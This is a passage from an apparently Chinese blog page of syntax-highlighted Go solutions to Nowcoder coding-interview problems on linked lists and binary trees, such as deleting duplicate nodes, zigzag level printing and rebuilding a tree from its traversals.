class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">    check :=<span class="built_in">make</span>(<span class="keyword">map</span>[*RandomListNode]*RandomListNode)</span><br><span class="line">    tem := head </span><br><span class="line">    <span class="keyword">for</span>  tem !=<span class="literal">nil</span> &#123;</span><br><span class="line">        dum := &amp;RandomListNode&#123;Label:tem.Label&#125;</span><br><span class="line">        check[tem]=dum</span><br><span class="line">        tem = tem.Next</span><br><span class="line">    &#125;</span><br><span class="line">    cur := head</span><br><span class="line">    <span class="keyword">for</span> cur != <span class="literal">nil</span> &#123;</span><br><span class="line">        check[cur].Random = check[cur.Random]</span><br><span class="line">        check[cur].Next = check[cur.Next]</span><br><span class="line">        cur = cur.Next</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> check[head]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="删除链表中重复的结点"><a href="#删除链表中重复的结点" class="headerlink" title="删除链表中重复的结点"></a><strong>删除链表中重复的结点</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> . <span class="string">&quot;nc_tools&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * type ListNode struct&#123;</span></span><br><span class="line"><span class="comment"> *   Val int</span></span><br><span class="line"><span class="comment"> *   Next *ListNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param pHead ListNode类 </span></span><br><span class="line"><span class="comment"> * @return ListNode类</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">deleteDuplication</span><span class="params">( pHead *ListNode )</span> *<span class="title">ListNode</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    <span class="keyword">if</span> pHead ==<span class="literal">nil</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">    pre := &amp;ListNode&#123;&#125;</span><br><span class="line">    pre.Next = pHead</span><br><span class="line">    cur := pre</span><br><span class="line">    <span class="keyword">for</span> cur != <span class="literal">nil</span> &amp;&amp; cur.Next != <span class="literal">nil</span> &amp;&amp; cur.Next.Next != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> cur.Next.Val == cur.Next.Next.Val&#123;</span><br><span class="line">            tmp := cur.Next.Val</span><br><span class="line">            <span class="keyword">for</span> cur.Next != <span class="literal">nil</span> &amp;&amp; cur.Next.Val == tmp&#123;</span><br><span class="line">                cur.Next = cur.Next.Next</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            cur = cur.Next</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> pre.Next</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="删除链表的节点"><a href="#删除链表的节点" class="headerlink" title="删除链表的节点"></a><strong>删除链表的节点</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> . <span class="string">&quot;nc_tools&quot;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * type ListNode struct&#123;</span></span><br><span class="line"><span class="comment"> *   Val int</span></span><br><span class="line"><span class="comment"> *   Next *ListNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param head ListNode类 </span></span><br><span class="line"><span class="comment"> * @param val int整型 </span></span><br><span class="line"><span class="comment"> * @return ListNode类</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">deleteNode</span><span class="params">( head *ListNode ,  val <span class="keyword">int</span> )</span> *<span class="title">ListNode</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    <span class="keyword">if</span> head == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">    pre := &amp;ListNode&#123;&#125;</span><br><span class="line">    tmp := pre</span><br><span class="line">    pre.Next = head</span><br><span class="line">    <span class="keyword">for</span> head != <span class="literal">nil</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> head.Val == val&#123;</span><br><span class="line">            pre.Next = head.Next</span><br><span class="line">        &#125;</span><br><span class="line">        pre = pre.Next</span><br><span class="line">        head = pre.Next</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tmp.Next</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="树"><a href="#树" class="headerlink" title="树"></a>树</h2><h3 id="二叉树的深度"><a href="#二叉树的深度" class="headerlink" title="二叉树的深度"></a><strong>二叉树的深度</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> . <span class="string">&quot;nc_tools&quot;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * type TreeNode struct &#123;</span></span><br><span class="line"><span class="comment"> *   Val int</span></span><br><span class="line"><span class="comment"> *   Left *TreeNode</span></span><br><span class="line"><span class="comment"> *   Right *TreeNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param pRoot TreeNode类 </span></span><br><span class="line"><span class="comment"> * @return int整型</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TreeDepth</span><span class="params">( pRoot *TreeNode )</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    <span class="keyword">if</span> pRoot == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    left := TreeDepth(pRoot.Left)</span><br><span class="line">    right := TreeDepth(pRoot.Right)</span><br><span class="line">    max := <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> left&gt;right&#123;</span><br><span class="line">        max = left+<span class="number">1</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        max = right+<span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> max</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="按之字形顺序打印二叉树"><a href="#按之字形顺序打印二叉树" class="headerlink" title="按之字形顺序打印二叉树"></a><strong>按之字形顺序打印二叉树</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> . <span class="string">&quot;nc_tools&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * type TreeNode struct &#123;</span></span><br><span class="line"><span class="comment"> *   Val int</span></span><br><span class="line"><span class="comment"> *   Left *TreeNode</span></span><br><span class="line"><span class="comment"> *   Right *TreeNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param pRoot TreeNode类 </span></span><br><span class="line"><span class="comment"> * @return int整型二维数组</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Print</span><span class="params">( pRoot *TreeNode )</span> [][]<span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    <span class="keyword">if</span> pRoot == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">    ans := [][]<span class="keyword">int</span>&#123;&#125;</span><br><span class="line">    lis := []*TreeNode&#123;&#125;</span><br><span class="line">    ll := <span class="built_in">len</span>(lis)</span><br><span class="line">    tl := []*TreeNode&#123;&#125;</span><br><span class="line">    tans := []<span class="keyword">int</span>&#123;&#125;</span><br><span class="line">    lis = <span class="built_in">append</span>(lis,pRoot)</span><br><span class="line">    flag := <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">len</span>(lis) != <span class="number">0</span>&#123;</span><br><span class="line">        ll = <span class="built_in">len</span>(lis)</span><br><span class="line">        tl = []*TreeNode&#123;&#125;</span><br><span class="line">        tans = []<span class="keyword">int</span>&#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> i:=<span class="number">0</span>;i&lt;ll;i++&#123;</span><br><span class="line">            tmp := lis[i]</span><br><span class="line">            tans = <span class="built_in">append</span>(tans,tmp.Val)</span><br><span class="line">            <span class="keyword">if</span> tmp.Left != <span class="literal">nil</span>&#123;</span><br><span class="line">                tl = <span class="built_in">append</span>(tl,tmp.Left)</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> tmp.Right != <span class="literal">nil</span>&#123;</span><br><span class="line">                tl = <span class="built_in">append</span>(tl,tmp.Right)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> flag ==<span class="number">0</span>&#123;</span><br><span class="line">        </span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            re(tans)</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        lis = tl</span><br><span class="line">        ans = <span class="built_in">append</span>(ans,tans)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">re</span><span class="params">(ll []<span class="keyword">int</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> i,l,tmp:=<span class="number">0</span>,<span class="built_in">len</span>(ll)<span class="number">-1</span>,<span class="number">0</span>;i&lt;l;i,l = i+<span class="number">1</span>,l<span class="number">-1</span>&#123;</span><br><span class="line">        tmp = ll[l] </span><br><span class="line">        ll[l] = ll[i] </span><br><span class="line">        ll[i] = tmp</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="二叉搜索树的第k个节点"><a href="#二叉搜索树的第k个节点" class="headerlink" title="二叉搜索树的第k个节点"></a><strong>二叉搜索树的第k个节点</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> . <span class="string">&quot;nc_tools&quot;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * type TreeNode struct &#123;</span></span><br><span class="line"><span class="comment"> *   Val int</span></span><br><span class="line"><span class="comment"> *   Left *TreeNode</span></span><br><span class="line"><span class="comment"> *   Right *TreeNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param proot TreeNode类 </span></span><br><span class="line"><span class="comment"> * @param k int整型 </span></span><br><span class="line"><span class="comment"> * @return int整型</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">var</span> cnt,res <span class="keyword">int</span> = <span class="number">0</span>,<span class="number">-1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">KthNode</span><span class="params">( proot *TreeNode ,  k <span class="keyword">int</span> )</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    <span class="keyword">if</span> proot == <span class="literal">nil</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">    &#125;</span><br><span class="line">    cnt = k</span><br><span class="line">    find(proot)</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">find</span><span class="params">( proot *TreeNode)</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> proot == <span class="literal">nil</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    find(proot.Left)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> cnt==<span class="number">1</span>&#123;</span><br><span class="line">        res = proot.Val</span><br><span class="line">    &#125;</span><br><span class="line">    cnt--</span><br><span class="line">    find(proot.Right)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="重建二叉树"><a href="#重建二叉树" class="headerlink" title="重建二叉树"></a><strong>重建二叉树</strong></h3><p>递归</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> . <span class="string">&quot;nc_tools&quot;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * type TreeNode struct &#123;</span></span><br><span class="line"><span class="comment"> *   Val int</span></span><br><span class="line"><span class="comment"> *   Left *TreeNode</span></span><br><span class="line"><span class="comment"> *   Right *TreeNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param pre int整型一维数组 </span></span><br><span class="line"><span class="comment"> * @param vin int整型一维数组 </span></span><br><span class="line"><span class="comment"> * @return TreeNode类</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">reConstructBinaryTree</span><span class="params">( pre []<span class="keyword">int</span> ,  vin []<span class="keyword">int</span> )</span> *<span class="title">TreeNode</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(pre) == <span class="number">0</span> || <span class="built_in">len</span>(vin) == <span class="number">0</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    root := &amp;TreeNode&#123;Val: pre[<span class="number">0</span>]&#125;</span><br><span class="line">    idx := findIndex(vin, pre[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> idx &gt; <span class="number">0</span> &#123;</span><br><span class="line">        root.Left = reConstructBinaryTree(pre[<span class="number">1</span>:idx+<span class="number">1</span>], vin[<span class="number">0</span>:idx])</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> idx+<span class="number">1</span> &lt; <span class="built_in">len</span>(vin) &#123;</span><br><span class="line">       root.Right = reConstructBinaryTree(pre[idx+<span class="number">1</span>:], vin[idx+<span class="number">1</span>:])</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> root</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">findIndex</span><span class="params">(a []<span class="keyword">int</span>, val <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i, v :=  <span class="keyword">range</span> a &#123;</span><br><span class="line">        <span class="keyword">if</span> v == val&#123;</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="树的子结构"><a href="#树的子结构" class="headerlink" title="树的子结构"></a><strong>树的子结构</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> . <span class="string">&quot;nc_tools&quot;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * type TreeNode struct &#123;</span></span><br><span class="line"><span class="comment"> *   Val int</span></span><br><span class="line"><span class="comment"> *   Left *TreeNode</span></span><br><span class="line"><span class="comment"> *   Right *TreeNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param pRoot1 TreeNode类 </span></span><br><span class="line"><span class="comment"> * @param pRoot2 TreeNode类 </span></span><br><span class="line"><span class="comment"> * @return bool布尔型</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">HasSubtree</span><span class="params">( pRoot1 *TreeNode ,  pRoot2 *TreeNode )</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    <span class="keyword">if</span> pRoot1 == <span class="literal">nil</span> || pRoot2 == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    res := <span class="literal">false</span></span><br><span class="line">    <span class="keyword">if</span> pRoot1.Val == pRoot2.Val &#123;</span><br><span class="line">        res = isSubtree(pRoot1, pRoot2)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> !res &#123;</span><br><span class="line">        res = HasSubtree(pRoot1.Left, pRoot2)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> !res &#123;</span><br><span class="line">        res = HasSubtree(pRoot1.Right, pRoot2)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isSubtree</span><span class="params">(pRoot1, pRoot2 *TreeNode)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> pRoot2 == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> pRoot1 == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> pRoot1.Val == pRoot2.Val &amp;&amp; </span><br><span class="line">    isSubtree(pRoot1.Left, pRoot2.Left) &amp;&amp; </span><br><span class="line">    isSubtree(pRoot1.Right, pRoot2.Right)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="二叉树的镜像"><a href="#二叉树的镜像" class="headerlink" title="二叉树的镜像"></a><strong>二叉树的镜像</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> . <span class="string">&quot;nc_tools&quot;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * type TreeNode struct &#123;</span></span><br><span class="line"><span class="comment"> *   Val int</span></span><br><span class="line"><span class="comment"> *   Left *TreeNode</span></span><br><span class="line"><span class="comment"> *   Right *TreeNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param pRoot TreeNode类 </span></span><br><span class="line"><span class="comment"> * @return TreeNode类</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Mirror</span><span class="params">( pRoot *TreeNode )</span> *<span class="title">TreeNode</span></span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    <span class="keyword">if</span> pRoot == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">    l := Mirror(pRoot.Left)</span><br><span class="line">    r := Mirror(pRoot.Right)</span><br><span class="line">    pRoot.Left = r </span><br><span class="line">    pRoot.Right = l</span><br><span class="line">    <span class="keyword">return</span> pRoot</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="从上往下打印二叉树"><a href="#从上往下打印二叉树" class="headerlink" title="从上往下打印二叉树"></a>从上往下打印二叉树</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span 